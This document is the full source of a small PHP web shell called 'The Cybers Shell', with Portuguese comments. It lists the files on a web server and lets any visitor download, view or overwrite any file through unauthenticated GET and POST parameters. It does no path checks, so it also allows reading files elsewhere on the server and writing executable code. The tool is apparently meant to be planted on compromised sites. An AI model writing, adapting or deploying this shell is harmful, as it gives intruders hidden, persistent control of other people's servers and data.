<!DOCTYPE html>
<html>
<head>
	<title>The Cybers Shell</title>
	<small>Coded by: Offset</small>

	<style>
		body{
			background-color:black;
			color:white;
		}
		th,td{
			background-color:#555;
			text-align: left;
			width:200px;
		}
	</style>
</head>
<body>
<h1>The Cybers Shell</h1>

<?php
/*
	By: The Cybers Team
	Versão: Beta 0.2
	[ok] listar
	[ok] download
*/
	// Funções =======================================================

	function listar($dir){
		echo "
			<table>
				<tr>
					<th>File</th>
					<th>Size</th>
					<th>View</th>
					<th>Download</th>
					<th>Edit</th>
					<th>Delete</th>
				</tr>
		";
		foreach(scandir($dir) as $file){
			if($file != "." && $file !=".."){
				echo "<tr>";
				echo "<td>".$file."</td>";
				echo "<td>".filesize($file)." bytes</td>";
				echo "<td><a href='$file'>Visualizar</a></td>";
				echo "<td><a href='?download=$file'>Download</a></td>";
				echo "<td><a href='?editar=$file'>Editar</a></td>";
				echo "<td>Deletar</td>";
				echo "</tr>";
			}
		}
		echo "</table>";
	}

	function download($arquivo){
	    header('Content-Type: application/octet-stream');
	    header('Content-Length: '.filesize($arquivo));
	    header('Content-Disposition: filename='.$arquivo);
	    readfile($arquivo);
	    exit();
	}

	function editar($editar){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<input name=arquivo type=hidden value='$editar'>";
		echo "<textarea name=salvar cols=100 rows=10>";
		foreach($arq as $linha){
			echo htmlspecialchars($linha);
		}
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=salvar>";
		echo "</form>";
		exit();
	}

	function salvar($dados, $arquivo){
		$fp = fopen($arquivo, "w");
		fwrite($fp,$dados);
		fclose($fp);
	}

	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
		salvar($salvar,$arquivo);
	}
	if($arquivo = $_GET['download']){
		download($arquivo);
	}

	if($editar = $_GET['editar']){
		editar($editar);
	}

	$diretorio = getcwd();
	listar($diretorio);


	?>
</body>
</html>
